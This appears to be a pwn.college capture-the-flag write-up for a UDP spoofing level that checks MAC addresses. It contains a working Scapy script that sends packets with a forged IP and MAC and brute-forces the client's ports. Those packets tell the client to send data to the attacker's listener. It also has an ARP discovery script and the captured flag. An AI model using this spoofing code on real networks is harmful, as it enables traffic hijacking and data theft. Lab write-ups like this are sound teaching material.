---
layout: page
title: "🛰️ UDP Spoofing 4 – Writeup (pwn.college)"
summary: "Writeup from Intercepting Communication"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Intercepting Communication"
date: 2026-04-27
---


## 📌 Challenge Summary

> In this level, **MAC address verification** is introduced. The client no longer just checks IP and port — it now verifies the **source MAC address** of the server. This mimics real-world behavior in local network spoofing, where **layer 2** details (MAC) matter. To succeed, you must **spoof the IP _and_ MAC address** of the server and deliver the payload to the correct source port.

---

## 🧠 Understanding the Setup

Three entities again:

- `Server (10.0.0.3)` → Real MAC: `86:d1:db:9c:0f:74`
- `Client (10.0.0.2)` → Real MAC: `ae:c5:25:6c:f0:ec`
- `Attacker (10.0.0.1)` → You, spoofing both IP and MAC

### 🧩 Key Points:
- The client sends a request to the server and waits for a reply.
- It expects that reply to come **from the correct IP and MAC**.
- The source port is still randomized — so we need to **brute-force the ephemeral ports**, but this time with proper MAC spoofing.

---

## 🔍 How We Exploit It

### 🔒 Challenge:
We need to forge a packet such that:
- `src IP` = `10.0.0.3` (spoofed)
- `dst IP` = `10.0.0.2` (client)
- `src MAC` = `86:d1:db:9c:0f:74` (server’s real MAC)
- `dst MAC` = `ae:c5:25:6c:f0:ec` (client’s real MAC)
- `UDP dport` = guessed (loop 49152–65535)
- Payload = `FLAG:10.0.0.1:12345` to redirect the response to us

---

## 🧪 Attack Plan

1. **Discover MAC addresses** using ARP scan via `mac_3.py`
2. **Sniff for flag response** on attacker's IP:port (`10.0.0.1:12345`)
3. **Send spoofed packets** using `sendp()` with:
   - Ethernet header (with spoofed MAC addresses)
   - IP/UDP payload with flag redirect
   - Loop through ports `49152–65535`
4. **Success**: If MAC/IP/port match, the client will send the flag to our listener

---

## 💣 Final Exploit – `ide.py`

```python
from scapy.all import send, sniff, IP, UDP , Ether , sendp
import threading
import sys

attacker_ip = '10.0.0.1'
attacker_port = 12345
target_ip = '10.0.0.2'
spoofed_src_ip = '10.0.0.3'

found_flag = False
src = input("mac src = ")  # Server MAC
dst = input("mac dst = ")  # Client MAC

def udp_req():
    global found_flag
    print("[*] Starting to send spoofed responses...")
    for i in range(49152, 65536):
        if found_flag:
            break
        pkt = Ether(src=src , dst=dst)/IP(dst=target_ip, src=spoofed_src_ip)/UDP(dport=i, sport=31337)
        payload = f'FLAG:{attacker_ip}:{attacker_port}'
        sendp(pkt/payload, verbose=False, iface='eth0')
    print("[*] Finished sending spoofed packets.")

def sniffer():
    global found_flag

    def handle(pkt):
        global found_flag
        if pkt.haslayer(UDP) and pkt[UDP].dport == attacker_port:
            print("[*] Flag captured!")
            print(f"Data: {bytes(pkt[UDP].payload)}")
            pkt.show()
            found_flag = True
            sys.exit(0)

    print("[*] Sniffing for incoming flag response...")
    sniff(filter=f"udp and port {attacker_port}", prn=handle)

if __name__ == "__main__":
    t = threading.Thread(target=sniffer)
    t.daemon = True
    t.start()
    udp_req()
    t.join()
```
###  MAC Discovery Script

```python
from scapy.all import ARP, Ether, srp

target_ip = input("ip:")

# Build the ARP request
arp = ARP(pdst=target_ip)
ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast

packet = ether / arp

# Send the packet and receive the response
ans, _ = srp(packet, timeout=2, verbose=False)

for sent, received in ans:
    print(f"IP: {received.psrc} - MAC: {received.hwsrc}")
```

### Output

```bash
mac src = 86:d1:db:9c:0f:74
mac dst = ae:c5:25:6c:f0:ec
[*] Sniffing for incoming flag response...
[*] Starting to send spoofed responses...
[*] Flag captured!
Data: b'pwn.college{AnV4AvxOApEFOrysLCQBN3nRBT1.01N0AjNxwSM0IzMyEzW}\n'
###[ Ethernet ]###
  dst       = 6a:ea:10:e5:9c:d8
  src       = ae:c5:25:6c:f0:ec
  type      = IPv4
###[ IP ]###
     src       = 10.0.0.2
     dst       = 10.0.0.1
###[ UDP ]###
     sport     = 57740
     dport     = 12345
###[ Raw ]###
     load      = b'pwn.college{AnV4AvxOApEFOrysLCQBN3nRBT1.01N0AjNxwSM0IzMyEzW}\n'
```

---

## Flag
```bash
pwn.college{AnV4AvxOApEFOrysLCQBN3nRBT1.01N0AjNxwSM0IzMyEzW}
```

---
